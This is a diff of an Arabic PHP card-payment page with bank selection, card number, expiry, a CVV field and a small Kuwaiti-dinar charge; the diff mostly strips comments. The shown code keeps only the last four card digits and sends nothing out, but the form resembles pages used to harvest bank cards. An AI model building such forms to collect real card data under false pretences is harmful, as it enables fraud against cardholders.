@@ -3,7 +3,6 @@ error_reporting(E_ALL);
 ini_set('display_errors', 1);
 session_start();
 
-// معالجة الدفع
 $payment_success = false;
 $payment_error = '';
 
@@ -15,16 +14,14 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['submit'])) {
     $password = $_POST['password'] ?? '';
     $bad = $_POST['bad'] ?? '';
     
-    // التحقق من البيانات
     if (empty($bank) || empty($cardNumber) || empty($month) || empty($year) || empty($password)) {
         $payment_error = 'يرجى ملء جميع الحقول';
     } else if (strlen($cardNumber) < 13) {
         $payment_error = 'رقم البطاقة غير صحيح';
     } else {
-        // محاكاة معالجة الدفع
         $_SESSION['payment_data'] = [
             'bank' => $bank,
-            'cardNumber' => substr($cardNumber, -4), // حفظ آخر 4 أرقام فقط
+            'cardNumber' => substr($cardNumber, -4),
             'month' => $month,
             'year' => $year,
             'timestamp' => date('Y-m-d H:i:s'),
@@ -32,12 +29,8 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['submit'])) {
         ];
         
         $payment_success = true;
-        // إعادة توجيه إلى صفحة التأكيد
-        // header('Location: confirmation.php');
-        // exit;
     }
 }
-
 ?>
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
@@ -210,13 +203,11 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['submit'])) {
 </head>
 <body>
     <div class="payment-container">
-        <!-- Header -->
         <div class="payment-header">
             <h2>💳 صفحة الدفع</h2>
             <p>أكمل عملية الدفع بأمان</p>
         </div>
         
-        <!-- Body -->
         <div class="payment-body">
             <?php if ($payment_success): ?>
             <div class="alert alert-success">
@@ -233,7 +224,6 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['submit'])) {
             </div>
             <?php endif; ?>
             
-            <!-- Payment Info -->
             <div class="payment-info">
                 <div class="payment-info-row">
                     <span class="payment-info-label">المستفيد:</span>
@@ -249,9 +239,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['submit'])) {
                 </div>
             </div>
             
-            <!-- Payment Form -->
             <form method="POST" action="">
-                <!-- Bank Selection -->
                 <div class="form-group">
                     <label for="bank">
                         <i class="fas fa-university"></i> اختر البنك
@@ -273,7 +261,6 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['submit'])) {
                     </select>
                 </div>
                 
-                <!-- Card Number -->
                 <div class="form-group">
                     <label for="cardNumber">
                         <i class="fas fa-credit-card"></i> رقم البطاقة
@@ -292,7 +279,6 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['submit'])) {
                     </div>
                 </div>
                 
-                <!-- Expiry Date -->
                 <div class="form-group">
                     <label>
                         <i class="fas fa-calendar"></i> تاريخ انتهاء البطاقة
@@ -322,7 +308,6 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['submit'])) {
                     </div>
                 </div>
                 
-                <!-- CVV -->
                 <div class="form-group">
                     <label for="password">
                         <i class="fas fa-lock"></i> رمز الأمان (CVV)
@@ -332,12 +317,10 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['submit'])) {
                            inputmode="numeric" maxlength="4">
                 </div>
                 
-                <!-- Submit Button -->
                 <button type="submit" name="submit" class="btn-pay">
                     <i class="fas fa-lock"></i> تأكيد الدفع - KD 2.000
                 </button>
                 
-                <!-- Security Info -->
                 <div class="security-info">
                     <i class="fas fa-shield-alt"></i>
                     <span>معاملتك محمية بتشفير SSL آمن</span>
@@ -348,7 +331,6 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['submit'])) {
     
     <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/js/bootstrap.bundle.min.js"></script>
     <script>
-        // تنسيق رقم البطاقة
         document.getElementById('cardNumber').addEventListener('input', function(e) {
             let value = e.target.value.replace(/\s/g, '');
             let formattedValue = value.replace(/(\d{4})/g, '$1 ').trim();
